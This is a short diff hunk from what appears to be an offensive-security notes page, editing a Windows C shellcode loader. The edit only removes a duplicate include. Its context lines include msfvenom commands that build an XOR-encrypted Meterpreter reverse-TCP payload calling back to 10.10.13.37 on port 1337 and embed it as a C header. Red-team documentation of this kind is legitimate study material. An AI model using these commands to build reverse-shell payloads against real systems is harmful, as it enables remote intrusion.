@@ -21,12 +21,9 @@
 {% tab title="Windows" %}
 {% code title="loader.c" %}
 ```c
-#include <stdio.h>
 #include <windows.h>
-
 // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f raw -o met.bin --encrypt xor --encrypt-key a
 // xxd -i met.bin > shellcode.h
-#include <windows.h>
 #include "shellcode.h"
 
 int main() {
